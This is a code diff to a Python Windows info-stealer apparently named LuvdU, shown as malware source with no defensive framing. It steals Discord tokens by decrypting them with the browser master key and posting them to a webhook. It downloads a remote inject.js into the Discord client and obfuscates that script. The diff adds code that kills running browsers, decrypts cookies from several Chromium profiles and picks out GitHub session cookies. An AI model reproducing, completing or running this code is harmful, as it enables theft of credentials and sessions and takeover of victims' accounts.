@@ -3,16 +3,18 @@ import json
 import os
 import random
 import re
-import subprocess
+import sqlite3
+import threading
 from base64 import b64encode
+from dataclasses import dataclass
 
-from Cryptodome.Cipher import AES
 import psutil as psutil
 import requests
+from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-appData = os.getenv("localappdata")
-rAppData = os.getenv("appdata")
+local = os.getenv("localappdata")
+roaming = os.getenv("appdata")
 webhook = open("webhook", "r").read()
 
 base = """function decrypt(chain) {
@@ -46,26 +48,24 @@ module.exports = require('./core.asar');"""
 
 
 def hideJS(scr1pt):
-    # set the alphabet
     alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-    # set the caesar key
-    k3y = ''.join(random.sample(alpha, 2))
-    g4p = sum(ord(c) for c in k3y) % 26
-    c43s4r = ''
+    key = ''.join(random.sample(alpha, 2))
+    gap = sum(ord(c) for c in key) % 26
+    caeser = ''
     for c in scr1pt:
         if c.isalpha():
             if c.islower():
-                c_int = chr((ord(c) - 97 + g4p) % 26 + 97)
+                cInt = chr((ord(c) - 97 + gap) % 26 + 97)
             else:
-                c_int = chr((ord(c) - 65 + g4p) % 26 + 65)
+                cInt = chr((ord(c) - 65 + gap) % 26 + 65)
         else:
-            c_int = c
-        c43s4r += c_int
-    o8f_st1 = str(c43s4r + k3y)
-    byt3 = o8f_st1.encode('UTF-8')
-    t3xt = b64encode(byt3)
-    jskr4mkr4m = base.replace('%SCRIPT%', t3xt.decode('UTF-8'))
-    return jskr4mkr4m
+            cInt = c
+        caeser += cInt
+    obfStr = str(caeser + key)
+    byte = obfStr.encode('UTF-8')
+    text = b64encode(byte)
+    js = base.replace('%SCRIPT%', text.decode('UTF-8'))
+    return js
 
 
 def getMasterKey(path: str):
@@ -82,10 +82,29 @@ def getMasterKey(path: str):
         pass
 
 
+def decryptVal(buff: bytes, masterKey: bytes) -> str:
+    cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
+    return cipher.decrypt(buff[15:])[:-16].decode()
+
+
+class LuvdU:
+    def __init__(self):
+        threads = []
+        payloads = [Browser]
+
+        for payload in payloads:
+            thread = threading.Thread(target=payload)
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+
 class Injection:
     def __init__(self):
         self.discords = [
-            f"{appData}\\Discord"
+            f"{local}\\Discord"
         ]
 
         self.code = requests.get("https://raw.githubusercontent.com/XoQ2988/LuvdU/master/inject.js").text
@@ -148,7 +167,6 @@ class Discord:
 
     def sendToken(self, token: str) -> None:
         userData = self.tokenInfo(token)
-        print(userData)
         requests.post(
             url=webhook,
             headers={
@@ -194,8 +212,8 @@ class Discord:
 
     def grabTokens(self):
         paths = {
-            "Discord": f"{rAppData}\\discord",
-            "Opera GX": f"{rAppData}\\Opera Software\\Opera GX Stable"
+            "Discord": f"{roaming}\\discord",
+            "Opera GX": f"{roaming}\\Opera Software\\Opera GX Stable"
         }
 
         for name, path in paths.items():
@@ -233,16 +251,12 @@ class Discord:
 
         return False
 
-    def _decryptToken(self, token: str, disc: str) -> str:
-        return self._decryptVal(
-            base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
-            getMasterKey(f"{rAppData}\\{disc}\\Local State")
-        )
-
     @staticmethod
-    def _decryptVal(buff: bytes, masterKey: bytes) -> str:
-        cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
-        return cipher.decrypt(buff[15:])[:-16].decode()
+    def _decryptToken(token: str, disc: str) -> str:
+        return decryptVal(
+            base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
+            getMasterKey(f"{roaming}\\{disc}\\Local State")
+        )
 
 
 class Info:
@@ -270,6 +284,94 @@ class Info:
         )
 
 
+class Browser:
+    def __init__(self):
+        # List of .exe to kill
+        exes = ["edge.exe", "brave.exe", "yandex.exe", "chrome.exe", "opera.exe"]
+        toKill = []
+
+        # List of browsers and their path
+        browsers = {
+            "Microsoft Edge": f"{local}\\Microsoft\\Edge",
+            "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
+            "Yandex": f"{local}\\Yandex",
+            "Google Chrome": f"{local}\\Google\\Chrome",
+            "Google Chrome Canary": f"{local}\\Google SxS\\Chrome",
+            "Opera": f"{roaming}\\Opera Software\\Opera Stable",
+            "Opera GX": f"{roaming}\\Opera Software\\Opera GX Stable",
+            "Opera Neon": f"{roaming}\\Opera Software\\Opera Stable"
+        }
+
+        # Generate list of profiles to check for data
+        profiles = ["Default"] + [x for x in [f"Profile {x + 1}" for x in range(5)]]
+
+        self.cookies = []
+        self.sessions = []
+
+        # Try to kill running processes to close files
+        for proc in psutil.process_iter(["name"]):
+            procName = proc.name().lower()
+            if procName in exes:
+                toKill.append(proc)
+
+        for proc in toKill:
+            try:
+                proc.kill()
+            except:
+                pass
+
+        for name, path in browsers.items():
+            if not os.path.exists(path):
+                continue
+
+            if "opera" not in name.lower():
+                path = f"{path}\\User Data"
+
+            self.mKey = getMasterKey(f"{path}\\Local State")
+
+            if not self.mKey:
+                continue
+
+            for profile in profiles:
+                if not os.path.exists(f"{path}\\{profile}"):
+                    continue
+                self.getCookies(path, profile)
+
+        self.getSessions()
+        print(self.sessions)
+
+    def getCookies(self, path: str, profile: str) -> None:
+        cookieDB = f"{path}\\{profile}\\Network\\Cookies"
+
+        if not os.path.exists(cookieDB):
+            return
+
+        conn = sqlite3.connect(cookieDB)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
+
+        for row in cursor.fetchall():
+            cookie = decryptVal(row[3], self.mKey)
+            self.cookies.append(Cookie(row[0], row[1], row[2], cookie, row[4]))
+
+    def getSessions(self) -> None:
+        sessionCookies = {
+            "github.com": "user_session"
+        }
+        for cookie in self.cookies:
+            for host, name in sessionCookies.items():
+                if cookie.host in host and cookie.name == name:
+                    self.sessions.append(cookie)
+
+
+@dataclass
+class Cookie:
+    host: str
+    name: str
+    path: str
+    value: str
+    expires: str
+
+
 if __name__ == "__main__":
-    Info()
-    Discord()
+    LuvdU()
